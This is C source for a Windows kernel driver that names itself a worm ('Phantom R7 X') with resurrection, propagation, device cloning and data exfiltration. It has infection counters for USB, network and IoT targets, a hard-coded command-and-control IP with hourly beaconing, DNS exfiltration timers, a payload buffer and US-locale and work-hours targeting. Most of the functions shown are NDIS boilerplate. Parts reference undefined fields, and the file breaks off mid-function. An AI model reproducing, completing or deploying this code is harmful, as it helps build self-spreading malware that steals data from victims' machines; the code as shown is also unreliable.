#include <ntddk.h>
#include <wdf.h>
#include <ntstrsafe.h>

// Phantom R7 X - Advanced kernel-level worm with resurrection capabilities

//typedef struct
// Device Extension Structure
typedef struct _DEVICE_EXTENSION {
    // NDIS Protocol Members
    NDIS_HANDLE ProtocolHandle;
    NDIS_STATUS NdisStatus;
    NDIS_ERROR_CODE LastError;
    NDIS_MEDIUM MediaType;
    NDIS_DEVICE_POWER_STATE PowerState;

    // Device State
    BOOLEAN FilterEnabled;
    BOOLEAN QueueEnabled;
    ULONG AdapterState;
    KEVENT Event;

    // Packet Queue
    PNDIS_PACKET PacketQueue[MAX_QUEUE_SIZE];
    ULONG QueueSize;
    KSPIN_LOCK QueueLock;

    // Statistics
    ULONG PacketsReceived;
    ULONG BytesReceived;
    ULONG OutstandingSends;
    ULONG OutstandingTransfers;

    // Pending Operations
    PIRP PendingRequest;
    PVOID StatusBuffer;
    ULONG StatusBufferSize;
    ULONG StatusBufferLength;
    KEVENT StatusEvent;

    // Device Info
    WCHAR DeviceName[256];
    ULONG DeviceNameLength;

    // Events
    KEVENT ReceiveEvent;
    KEVENT ReceiveWaitEvent;
    ULONG ReceiveWaitCount;

    // Callback Handler
    RECEIVE_HANDLER ReceiveHandler;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

// TCP/IP Related Structures
typedef struct _TCP_CONNECT_INFO {
    struct {
        USHORT sin_family;
        USHORT sin_port;
        union {
            ULONG s_addr;
        } sin_addr;
        CHAR sin_zero[8];
    } RemoteAddress;
} TCP_CONNECT_INFO, *PTCP_CONNECT_INFO;

typedef struct _ADDRESS_OBJECT {
    ULONG LocalAddress;
    USHORT LocalPort;
    ULONG RemoteAddress;
    USHORT RemotePort;
    USHORT Protocol;
} ADDRESS_OBJECT, *PADDRESS_OBJECT;

typedef struct _TCP_REQUEST_QUERY_INFORMATION_EX {
    struct {
        struct {
            ULONG tei_entity;
            ULONG tei_instance;
        } toi_entity;
        ULONG toi_class;
        ULONG toi_type;
        ULONG toi_id;
    } ID;
} TCP_REQUEST_QUERY_INFORMATION_EX, *PTCP_REQUEST_QUERY_INFORMATION_EX;

// Forward declarations
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
NTSTATUS PhantomResurrect(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS PhantomPropagate(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS PhantomCloneDevice(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS PhantomExfiltrateData(PDEVICE_OBJECT DeviceObject, PIRP Irp);

//Constants
// IOCTL codes for Phantom operations
#define IOCTL_PHANTOM_RESURRECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PHANTOM_PROPAGATE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PHANTOM_CLONE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Phantom_EXFILTRATE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Target types for infection tracking
#define TARGET_TYPE_USB 0
#define TARGET_TYPE_NETWORK 1 
#define TARGET_TYPE_IOT 2

// Global variables
PDEVICE_OBJECT g_PhantomDevice = NULL;
UNICODE_STRING g_DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KernelPhantom");
UNICODE_STRING g_DosDeviceName = RTL_CONSTANT_STRING(L"\\DosDevices\\KernelPhantom");
// Infection statistics tracking
volatile LONG g_SuccessfulInfections = 0;
volatile LONG g_UsbInfections = 0;
volatile LONG g_NetworkInfections = 0; 
volatile LONG g_IotInfections = 0;
volatile LONG g_FailedInfections = 0;
volatile LONG g_ConsecutiveFailures = 0;
volatile LONG g_InfectionBackoffTime = 1000; // Initial backoff in milliseconds
#define MAX_BACKOFF_TIME (1000 * 60 * 60) // 1 hour max backoff

//Beacon Context
typedef struct _BEACON_CONTEXT {
    PDEVICE_OBJECT DeviceObject;
    ULONG FailedAttempts;
    LARGE_INTEGER LastBeaconTime;
    ULONG RetryInterval;
} BEACON_CONTEXT, *PBEACON_CONTEXT;

// Target success rate tracking per infection vector
typedef struct _TARGET_SUCCESS_RATE {
    volatile LONG Attempts;
    volatile LONG Successes; 
    KSPIN_LOCK Lock;
} TARGET_SUCCESS_RATE, *PTARGET_SUCCESS_RATE;

TARGET_SUCCESS_RATE g_TargetSuccessRates[3] = {
    {0, 0}, // USB
    {0, 0}, // Network  
    {0, 0}  // IoT
};

// Debug flags for logging and diagnostics
volatile ULONG g_DebugFlags = 0;
#define DBG_INFECTION_ATTEMPTS 0x00000001

// Random number generator seed for infection targeting
volatile LONG g_Seed = 0;

// Network Buffer
#define MAX_NETWORK_BUFFER_SIZE (64 * 1024)
PUCHAR g_NetworkBuffer = NULL;

// Initial delay before first resurrection attempt
#define INITIAL_RESURRECTION_DELAY (1000 * 60 * 5) // 5 minutes

// Malware payload buffer and size
PUCHAR g_MalwareImage = NULL;
#define MALWARE_SIZE (1024 * 1024) // 1MB payload size
#define DEVICE_MEMORY_SIZE (16 * 1024) // 16KB device memory\


// NDIS protocol handle and adapter list
NDIS_HANDLE g_NdisProtocolHandle = NULL;
LIST_ENTRY g_AdapterList;



// Resurrection timer
KTIMER g_ResurrectionTimer;
KDPC g_ResurrectionDpc;

// Infection tracking
#define MAX_INFECTED_DEVICES 1024
WCHAR g_InfectedDevices[MAX_INFECTED_DEVICES][256];
ULONG g_NumInfectedDevices = 0;

// Device cloning tracking
#define MAX_CLONED_DEVICES 256
typedef struct _CLONED_DEVICE {
    UCHAR MacAddress[6];
    ULONG IpAddress;
    WCHAR DeviceName[256];
    BOOLEAN Active;
} CLONED_DEVICE, *PCLONED_DEVICE;

CLONED_DEVICE g_ClonedDevices[MAX_CLONED_DEVICES];
ULONG g_NumClonedDevices = 0;

// Targeting configuration
#define TARGET_DAY_OF_WEEK 5  // Friday = 5
#define TARGET_COUNTRY_CODE 0x0409  // US locale ID

// AI behavior adaptation
#define MAX_BEHAVIOR_HISTORY 100
typedef struct _INFECTION_ATTEMPT {
    ULONG TargetType;  // USB, Network, IoT, etc
    BOOLEAN Success;
    LARGE_INTEGER Timestamp;
} INFECTION_ATTEMPT, *PINFECTION_ATTEMPT;

INFECTION_ATTEMPT g_BehaviorHistory[MAX_BEHAVIOR_HISTORY];
ULONG g_BehaviorHistoryIndex = 0;


// C2 beaconing configuration
#define BEACON_INTERVAL 3600  // 1 hour in seconds
KTIMER g_BeaconTimer;
KDPC g_BeaconDpc;
ULONG g_C2ServerAddress = 0x4C624E03;  // 76.98.78.3 in hex format (0x4C=76, 0x62=98, 0x4E=78, 0x03=3)

// Data exfiltration configuration
#define DNS_EXFIL_INTERVAL 300 // 5 minutes in seconds
#define BT_SCAN_INTERVAL 600 // 10 minutes in seconds
KTIMER g_ExfilTimer;
KDPC g_ExfilDpc;
UNICODE_STRING g_ExfilDNSServer = RTL_CONSTANT_STRING(L"\\Device\\Afd\\ExfilDNS");

VOID
PhantomLogAdapterEvent(
    IN PDEVICE_EXTENSION DeviceExtension,
    IN ULONG EventType,
    IN NDIS_STATUS Status,
    IN NDIS_STATUS ErrorStatus
)
{
    LARGE_INTEGER timestamp;
    
    // Get current timestamp
    KeQuerySystemTime(&timestamp);
    
    // Store event in behavior history if it's an infection attempt
    if (EventType == PHANTOM_EVENT_ADAPTER_OPEN) {
        g_BehaviorHistory[g_BehaviorHistoryIndex].TargetType = INFECTION_TARGET_NETWORK;
        g_BehaviorHistory[g_BehaviorHistoryIndex].Success = (Status == NDIS_STATUS_SUCCESS);
        g_BehaviorHistory[g_BehaviorHistoryIndex].Timestamp = timestamp;
        
        g_BehaviorHistoryIndex = (g_BehaviorHistoryIndex + 1) % MAX_BEHAVIOR_HISTORY;
    }
    
    // Log event details if logging is enabled
    if (DeviceExtension->LoggingEnabled) {
        // Store basic event info
        DeviceExtension->LastEventType = EventType;
        DeviceExtension->LastEventStatus = Status;
        DeviceExtension->LastEventTimestamp = timestamp;
        DeviceExtension->LastEventError = ErrorStatus;
        
        // Signal logging event
        KeSetEvent(&DeviceExtension->LogEvent, IO_NO_INCREMENT, FALSE);
    }
    
    return;
}


// NDIS Protocol handler functions
NDIS_STATUS
PhantomOpenAdapterComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_STATUS Status,
    IN NDIS_STATUS OpenErrorStatus
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;
    
    // Validate parameters
    if (!ProtocolBindingContext) {
        return NDIS_STATUS_FAILURE;
    }
    
    // Store adapter open status
    deviceExtension->NdisStatus = Status;
    
    // Store any error status
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = OpenErrorStatus;
    }
    
    // Update adapter state
    deviceExtension->AdapterState = (Status == NDIS_STATUS_SUCCESS) ? 
        ADAPTER_STATE_OPEN : ADAPTER_STATE_ERROR;
        
    // Signal completion event
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
    
    // Log completion status
    PhantomLogAdapterEvent(
        deviceExtension,
        PHANTOM_EVENT_ADAPTER_OPEN,
        Status,
        OpenErrorStatus
    );
    
    return Status;
}

VOID 
PhantomCloseAdapterComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_STATUS Status
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;
    
    // Validate parameters
    if (!ProtocolBindingContext) {
        return;
    }
    
    // Store adapter close status
    deviceExtension->NdisStatus = Status;
    
    // Update adapter state
    deviceExtension->AdapterState = ADAPTER_STATE_CLOSED;
    
    // Store any error status
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = Status;
    }
    
    // Log completion status
    PhantomLogAdapterEvent(
        deviceExtension,
        PHANTOM_EVENT_ADAPTER_CLOSE,
        Status,
        0
    );
    
    // Cleanup adapter resources
    if (deviceExtension->AdapterHandle) {
        NdisFreeMemory(deviceExtension->AdapterHandle, 0, 0);
        deviceExtension->AdapterHandle = NULL;
    }
    
    // Signal completion event
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
}

VOID
PhantomSendComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN PNDIS_PACKET Packet,
    IN NDIS_STATUS Status
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Validate parameters
    if (!ProtocolBindingContext || !Packet) {
        return;
    }

    // Store completion status
    deviceExtension->NdisStatus = Status;

    // Log any errors
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = Status;
        PhantomLogAdapterEvent(
            deviceExtension,
            PHANTOM_EVENT_SEND_ERROR,
            Status,
            0
        );
    }

    // Free the packet
    NdisFreePacket(Packet);

    // Update statistics
    InterlockedDecrement(&deviceExtension->OutstandingSends);

    // Signal completion
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
}

VOID
PhantomTransferDataComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN PNDIS_PACKET Packet,
    IN NDIS_STATUS Status,
    IN UINT BytesTransferred
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Validate parameters
    if (!ProtocolBindingContext || !Packet) {
        return;
    }

    // Store transfer results
    deviceExtension->BytesTransferred = BytesTransferred;
    deviceExtension->NdisStatus = Status;

    // Log any errors
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = Status;
        PhantomLogAdapterEvent(
            deviceExtension,
            PHANTOM_EVENT_TRANSFER_ERROR,
            Status,
            BytesTransferred
        );
    }

    // Free the packet
    NdisFreePacket(Packet);

    // Update statistics
    InterlockedDecrement(&deviceExtension->OutstandingTransfers);

    // Signal completion
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
}

VOID
PhantomResetComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_STATUS Status
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Validate parameters
    if (!ProtocolBindingContext) {
        return;
    }

    // Store reset status
    deviceExtension->NdisStatus = Status;

    // Log any errors
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = Status;
        PhantomLogAdapterEvent(
            deviceExtension,
            PHANTOM_EVENT_RESET_ERROR,
            Status,
            0
        );
    }

    // Reset adapter state
    deviceExtension->AdapterState = ADAPTER_STATE_RESET;
    deviceExtension->OutstandingSends = 0;
    deviceExtension->OutstandingTransfers = 0;

    // Clear any pending operations
    if (deviceExtension->PendingRequest) {
        NdisFreeMemory(deviceExtension->PendingRequest, 0, 0);
        deviceExtension->PendingRequest = NULL;
    }

    // Signal completion event
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
}

BOOLEAN
PhantomShouldProcessPacket(
    IN PDEVICE_EXTENSION DeviceExtension,
    IN PVOID HeaderBuffer,
    IN UINT HeaderBufferSize
)
{
    // Validate parameters
    if (!DeviceExtension || !HeaderBuffer || HeaderBufferSize == 0) {
        return FALSE;
    }

    // Check if filtering is enabled
    if (!DeviceExtension->FilterEnabled) {
        return TRUE;
    }

    // Check if queue is full
    if (DeviceExtension->QueueSize >= MAX_QUEUE_SIZE) {
        return FALSE;
    }

    // Check adapter state
    if (DeviceExtension->AdapterState != ADAPTER_STATE_RUNNING) {
        return FALSE;
    }

    // Check power state
    if (DeviceExtension->PowerState != NdisDeviceStateD0) {
        return FALSE;
    }

    // Check outstanding operations
    if (DeviceExtension->OutstandingTransfers > 0) {
        return FALSE;
    }

    return TRUE;
}

VOID
PhantomQueuePacket(
    IN PDEVICE_EXTENSION DeviceExtension,
    IN PVOID HeaderBuffer,
    IN UINT HeaderBufferSize,
    IN PVOID LookAheadBuffer,
    IN UINT LookAheadBufferSize
)
{
    // Validate parameters
    if (!DeviceExtension || !HeaderBuffer || HeaderBufferSize == 0) {
        return;
    }

    // Acquire queue lock
    KIRQL oldIrql;
    KeAcquireSpinLock(&DeviceExtension->QueueLock, &oldIrql);

    // Check if queue is full
    if (DeviceExtension->QueueSize >= MAX_QUEUE_SIZE) {
        KeReleaseSpinLock(&DeviceExtension->QueueLock, oldIrql);
        return;
    }

    // Add buffers to queue
    DeviceExtension->HeaderBuffers[DeviceExtension->QueueSize] = HeaderBuffer;
    DeviceExtension->HeaderBufferSizes[DeviceExtension->QueueSize] = HeaderBufferSize;
    
    if (LookAheadBuffer && LookAheadBufferSize > 0) {
        DeviceExtension->LookAheadBuffers[DeviceExtension->QueueSize] = LookAheadBuffer;
        DeviceExtension->LookAheadBufferSizes[DeviceExtension->QueueSize] = LookAheadBufferSize;
    }
    
    DeviceExtension->QueueSize++;

    // Update statistics
    DeviceExtension->PacketsReceived++;
    DeviceExtension->BytesReceived += HeaderBufferSize;

    // Signal receive event
    KeSetEvent(&DeviceExtension->ReceiveEvent, IO_NO_INCREMENT, FALSE);

    // Release queue lock
    KeReleaseSpinLock(&DeviceExtension->QueueLock, oldIrql);

    // Increment outstanding operations
    InterlockedIncrement(&DeviceExtension->OutstandingTransfers);

    // Notify receive handler if registered
    if (DeviceExtension->ReceiveHandler) {
        DeviceExtension->ReceiveHandler(DeviceExtension, HeaderBuffer);
    }
}

VOID
PhantomProcessQueuedPackets(
    IN PDEVICE_EXTENSION DeviceExtension
)
{
    // Validate parameter
    if (!DeviceExtension) {
        return;
    }

    KIRQL oldIrql;
    KeAcquireSpinLock(&DeviceExtension->QueueLock, &oldIrql);

    // Process all queued packets
    while (DeviceExtension->QueueSize > 0) {
        PVOID headerBuffer = DeviceExtension->HeaderBuffers[0];
        UINT headerSize = DeviceExtension->HeaderBufferSizes[0];
        PVOID lookAheadBuffer = DeviceExtension->LookAheadBuffers[0];
        UINT lookAheadSize = DeviceExtension->LookAheadBufferSizes[0];

        // Shift remaining packets forward
        for (UINT i = 1; i < DeviceExtension->QueueSize; i++) {
            DeviceExtension->HeaderBuffers[i-1] = DeviceExtension->HeaderBuffers[i];
            DeviceExtension->HeaderBufferSizes[i-1] = DeviceExtension->HeaderBufferSizes[i];
            DeviceExtension->LookAheadBuffers[i-1] = DeviceExtension->LookAheadBuffers[i];
            DeviceExtension->LookAheadBufferSizes[i-1] = DeviceExtension->LookAheadBufferSizes[i];
        }

        DeviceExtension->QueueSize--;

        // Release lock while processing packet
        KeReleaseSpinLock(&DeviceExtension->QueueLock, oldIrql);

        // Process the packet
        if (DeviceExtension->ReceiveHandler) {
            DeviceExtension->ReceiveHandler(DeviceExtension, headerBuffer);
        }

        // Reacquire lock for next iteration
        KeAcquireSpinLock(&DeviceExtension->QueueLock, &oldIrql);
    }

    KeReleaseSpinLock(&DeviceExtension->QueueLock, oldIrql);
}


VOID
PhantomRequestComplete(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN PNDIS_REQUEST NdisRequest,
    IN NDIS_STATUS Status
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Validate parameters
    if (!ProtocolBindingContext) {
        return;
    }

    // Store request status
    deviceExtension->NdisStatus = Status;

    // Log any errors
    if (Status != NDIS_STATUS_SUCCESS) {
        deviceExtension->LastError = Status;
        PhantomLogAdapterEvent(
            deviceExtension,
            PHANTOM_EVENT_REQUEST_ERROR,
            Status,
            0
        );
    }

    // Free the pending request if present
    if (deviceExtension->PendingRequest) {
        NdisFreeMemory(deviceExtension->PendingRequest, 0, 0);
        deviceExtension->PendingRequest = NULL;
    }

    // Update statistics
    InterlockedDecrement(&deviceExtension->OutstandingTransfers);

    // Signal completion
    KeSetEvent(&deviceExtension->Event, IO_NO_INCREMENT, FALSE);
}

NDIS_STATUS
PhantomReceive(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_HANDLE MacReceiveContext,
    IN PVOID HeaderBuffer,
    IN UINT HeaderBufferSize,
    IN PVOID LookAheadBuffer,
    IN UINT LookAheadBufferSize,
    IN UINT PacketSize
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;
    NDIS_STATUS status = NDIS_STATUS_SUCCESS;
    
    // Validate parameters
    if (!ProtocolBindingContext || !HeaderBuffer || !LookAheadBuffer) {
        return NDIS_STATUS_INVALID_PARAMETER;
    }

    // Update statistics
    InterlockedIncrement(&deviceExtension->PacketsReceived);
    InterlockedAdd(&deviceExtension->BytesReceived, PacketSize);

    // Check if we should process this packet based on filters
    if (!deviceExtension->FilterEnabled || 
        PhantomShouldProcessPacket(HeaderBuffer, HeaderBufferSize)) {

        // Process received packet through registered handler
        if (deviceExtension->ReceiveHandler) {
            __try {
                status = deviceExtension->ReceiveHandler(
                    HeaderBuffer,
                    HeaderBufferSize,
                    LookAheadBuffer, 
                    LookAheadBufferSize,
                    PacketSize
                );
            }
            __except(EXCEPTION_EXECUTE_HANDLER) {
                // Log error and continue
                PhantomLogAdapterEvent(
                    deviceExtension,
                    PHANTOM_EVENT_RECEIVE_ERROR,
                    GetExceptionCode(),
                    0
                );
                status = NDIS_STATUS_FAILURE;
            }
        }

        // Queue packet for later processing if needed
        if (deviceExtension->QueueEnabled && 
            deviceExtension->PacketQueue &&
            deviceExtension->QueueSize < MAX_QUEUE_SIZE) {
            
            PhantomQueuePacket(
                deviceExtension,
                HeaderBuffer,
                HeaderBufferSize,
                LookAheadBuffer,
                LookAheadBufferSize
            );
        }
    }

    return status;
}

VOID
PhantomReceiveComplete(
    IN NDIS_HANDLE ProtocolBindingContext
)
{
    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Validate input parameter
    if (!ProtocolBindingContext) {
        return;
    }

    // Update completion statistics
    InterlockedIncrement(&deviceExtension->ReceiveCompletions);

    // Signal receive completion event
    if (deviceExtension->ReceiveEvent.Header.Type == NotificationEvent) {
        KeSetEvent(&deviceExtension->ReceiveEvent, IO_NO_INCREMENT, FALSE);
    }

    // Process any queued packets if needed
    if (deviceExtension->QueueEnabled && 
        deviceExtension->PacketQueue &&
        deviceExtension->QueueSize > 0) {
        
        PhantomProcessQueuedPackets(deviceExtension);
    }

    // Notify any waiting threads
    if (deviceExtension->ReceiveWaitCount > 0) {
        KeSetEvent(&deviceExtension->ReceiveWaitEvent, IO_NO_INCREMENT, FALSE);
    }
}

VOID
PhantomStatus(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_STATUS Status,
    IN PVOID StatusBuffer,
    IN UINT StatusBufferSize
)
{
    // Validate input parameters
    if (!ProtocolBindingContext) {
        return;
    }

    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;
    
    // Update NDIS status
    deviceExtension->NdisStatus = Status;
    
    // Copy status buffer if provided
    if (StatusBuffer && StatusBufferSize > 0 && deviceExtension->StatusBuffer) {
        // Ensure we don't overflow the destination buffer
        UINT copySize = min(StatusBufferSize, deviceExtension->StatusBufferSize);
        
        __try {
            RtlCopyMemory(deviceExtension->StatusBuffer, 
                         StatusBuffer,
                         copySize);
            
            // Store actual copied size
            deviceExtension->StatusBufferLength = copySize;
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            // Handle copy failure
            deviceExtension->StatusBufferLength = 0;
            deviceExtension->NdisStatus = NDIS_STATUS_FAILURE;
        }
    }
    else {
        deviceExtension->StatusBufferLength = 0;
    }

    // Signal status event if configured
    if (deviceExtension->StatusEvent.Header.Type == NotificationEvent) {
        KeSetEvent(&deviceExtension->StatusEvent, IO_NO_INCREMENT, FALSE);
    }
}

VOID
PhantomStatusComplete(
    IN NDIS_HANDLE ProtocolBindingContext
)
{
    // Validate input parameter
    if (!ProtocolBindingContext) {
        return;
    }

    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    // Only signal if event is properly initialized
    if (deviceExtension->StatusEvent.Header.Type == NotificationEvent) {
        KeSetEvent(&deviceExtension->StatusEvent, IO_NO_INCREMENT, FALSE);
    }

    // Clear status buffer since operation is complete
    if (deviceExtension->StatusBuffer) {
        deviceExtension->StatusBufferLength = 0;
        RtlZeroMemory(deviceExtension->StatusBuffer, deviceExtension->StatusBufferSize);
    }

    // Reset NDIS status to success
    deviceExtension->NdisStatus = NDIS_STATUS_SUCCESS;
}

NDIS_STATUS
PhantomBindAdapter(
    OUT PNDIS_STATUS OpenErrorStatus,
    IN NDIS_HANDLE BindContext, 
    IN PNDIS_STRING DeviceName,
    IN PVOID SystemSpecific1,
    IN PVOID SystemSpecific2
)
{
    NDIS_STATUS status = NDIS_STATUS_SUCCESS;
    *OpenErrorStatus = NDIS_STATUS_SUCCESS;

    // Validate input parameters
    if (!OpenErrorStatus || !DeviceName || !SystemSpecific1) {
        return NDIS_STATUS_INVALID_PARAMETER;
    }

    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)SystemSpecific1;
    
    // Validate device extension
    if (!deviceExtension->DeviceName || !deviceExtension->DeviceNameLength) {
        return NDIS_STATUS_RESOURCES;
    }

    __try {
        // Store the device name
        if (DeviceName->Length <= deviceExtension->DeviceNameLength) {
            RtlCopyMemory(deviceExtension->DeviceName,
                         DeviceName->Buffer,
                         DeviceName->Length);
            
            // Null terminate the string
            PWCHAR terminator = (PWCHAR)((PUCHAR)deviceExtension->DeviceName + DeviceName->Length);
            *terminator = L'\0';
        }
        else {
            status = NDIS_STATUS_BUFFER_TOO_SHORT;
            *OpenErrorStatus = status;
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        status = NDIS_STATUS_FAILURE;
        *OpenErrorStatus = status;
    }

    // Initialize device extension fields
    deviceExtension->PowerState = NdisDeviceStateD0;
    deviceExtension->NdisStatus = NDIS_STATUS_SUCCESS;
    deviceExtension->StatusBufferLength = 0;
    
    return status;
}

NDIS_STATUS
PhantomUnbindAdapter(
    OUT PNDIS_STATUS OpenErrorStatus,
    IN NDIS_HANDLE ProtocolBindingContext,
    IN NDIS_HANDLE UnbindContext
)
{
    NDIS_STATUS status = NDIS_STATUS_SUCCESS;
    *OpenErrorStatus = NDIS_STATUS_SUCCESS;

    // Validate input parameters
    if (!OpenErrorStatus || !ProtocolBindingContext) {
        return NDIS_STATUS_INVALID_PARAMETER;
    }

    PDEVICE_EXTENSION deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    __try {
        // Cleanup device extension
        if (deviceExtension->DeviceName && deviceExtension->DeviceNameLength) {
            RtlZeroMemory(deviceExtension->DeviceName,
                         deviceExtension->DeviceNameLength);
            deviceExtension->DeviceNameLength = 0;
        }

        // Reset device extension fields
        deviceExtension->PowerState = NdisDeviceStateD0;
        deviceExtension->NdisStatus = NDIS_STATUS_SUCCESS;
        deviceExtension->StatusBufferLength = 0;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        status = NDIS_STATUS_FAILURE;
        *OpenErrorStatus = status;
    }

    return status;
}

NDIS_STATUS
PhantomPnPEventHandler(
    IN NDIS_HANDLE ProtocolBindingContext,
    IN PNET_PNP_EVENT NetPnPEvent
)
{
    NDIS_STATUS status = NDIS_STATUS_SUCCESS;
    PDEVICE_EXTENSION deviceExtension;

    // Validate input parameters
    if (!ProtocolBindingContext || !NetPnPEvent) {
        return NDIS_STATUS_INVALID_PARAMETER;
    }

    deviceExtension = (PDEVICE_EXTENSION)ProtocolBindingContext;

    __try {
        switch (NetPnPEvent->NetEvent) {
            case NetEventSetPower:
                // Handle power state changes
                if (!NetPnPEvent->Buffer || NetPnPEvent->BufferLength < sizeof(NET_DEVICE_POWER_STATE)) {
                    status = NDIS_STATUS_INVALID_LENGTH;
                    break;
                }

                deviceExtension->PowerState = ((PNET_DEVICE_POWER_STATE)NetPnPEvent->Buffer)->NewPowerState;

                // Update device status based on power state
                if (deviceExtension->PowerState == NdisDeviceStateD0) {
                    deviceExtension->NdisStatus = NDIS_STATUS_SUCCESS;
                } else {
                    deviceExtension->NdisStatus = NDIS_STATUS_LOW_POWER_STATE;
                }
                break;

            case NetEventQueryPower:
                // Verify we can transition to requested power state
                if (NetPnPEvent->Buffer && NetPnPEvent->BufferLength >= sizeof(NET_DEVICE_POWER_STATE)) {
                    NDIS_DEVICE_POWER_STATE requestedState = 
                        ((PNET_DEVICE_POWER_STATE)NetPnPEvent->Buffer)->NewPowerState;
                    if (requestedState < NdisDeviceStateD0 || requestedState > NdisDeviceStateD3) {
                        status = NDIS_STATUS_NOT_SUPPORTED;
                    }
                }
                break;

            case NetEventQueryRemoveDevice:
                // Prepare for potential removal
                deviceExtension->NdisStatus = NDIS_STATUS_CLOSING;
                break;

            case NetEventCancelRemoveDevice:
                // Reset status after removal cancelled
                deviceExtension->NdisStatus = NDIS_STATUS_SUCCESS;
                break;

            case NetEventReconfigure:
                // Handle reconfiguration
                if (deviceExtension->PowerState != NdisDeviceStateD0) {
                    status = NDIS_STATUS_NOT_ACCEPTED;
                }
                break;

            case NetEventBindList:
                // Process bind list changes
                if (NetPnPEvent->Buffer && NetPnPEvent->BufferLength > 0) {
                    deviceExtension->StatusBufferLength = min(NetPnPEvent->BufferLength, 
                                                            sizeof(deviceExtension->StatusBuffer));
                    RtlCopyMemory(deviceExtension->StatusBuffer,
                                NetPnPEvent->Buffer,
                                deviceExtension->StatusBufferLength);
                }
                break;

            case NetEventPnPCapabilities:
                // Return device PnP capabilities
                if (NetPnPEvent->Buffer && NetPnPEvent->BufferLength >= sizeof(ULONG)) {
                    *(PULONG)NetPnPEvent->Buffer = NDIS_DEVICE_WAKE_UP_ENABLE;
                }
                break;

            default:
                status = NDIS_STATUS_NOT_SUPPORTED;
                break;
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        status = NDIS_STATUS_FAILURE;
    }

    return status;
}



// Helper function to get system root path
BOOLEAN GetSystemRoot(WCHAR* Buffer) {
    UNICODE_STRING systemRoot;
    RTL_QUERY_REGISTRY_TABLE queryTable[2] = {0};
    
    // Initialize systemRoot
    RtlInitUnicodeString(&systemRoot, NULL);
    
    // Setup query table
    queryTable[0].Name = L"SystemRoot";
    queryTable[0].Flags = RTL_QUERY_REGISTRY_DIRECT;
    queryTable[0].EntryContext = &systemRoot;

    // Query registry for SystemRoot
    NTSTATUS status = RtlQueryRegistryValues(
        RTL_REGISTRY_WINDOWS_NT,
        NULL,
        queryTable,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        if (systemRoot.Buffer) {
            ExFreePool(systemRoot.Buffer);
        }
        return FALSE;
    }

    // Copy path to output buffer
    if (systemRoot.Length > 0 && systemRoot.Buffer) {
        RtlCopyMemory(Buffer, systemRoot.Buffer, systemRoot.Length);
        Buffer[systemRoot.Length/sizeof(WCHAR)] = UNICODE_NULL;
        ExFreePool(systemRoot.Buffer);
        return TRUE;
    }

    return FALSE;
}

// Check if current time is within target window
BOOLEAN IsSystemInTargetTimeWindow() {
    LARGE_INTEGER systemTime;
    TIME_FIELDS timeFields;
    BOOLEAN isWorkDay, isWorkHours;
    
    // Get current system time
    KeQuerySystemTime(&systemTime);
    RtlTimeToTimeFields(&systemTime, &timeFields);
    
    // Check if it's a work day (Mon-Fri)
    isWorkDay = (timeFields.Weekday >= 1 && timeFields.Weekday <= 5);
    
    // Check if within work hours (9am-5pm)
    isWorkHours = (timeFields.Hour >= 9 && timeFields.Hour < 17);
    
    // If hour is 17 (5pm), also check minutes
    if (timeFields.Hour == 17) {
        isWorkHours = (timeFields.Minute == 0);
    }
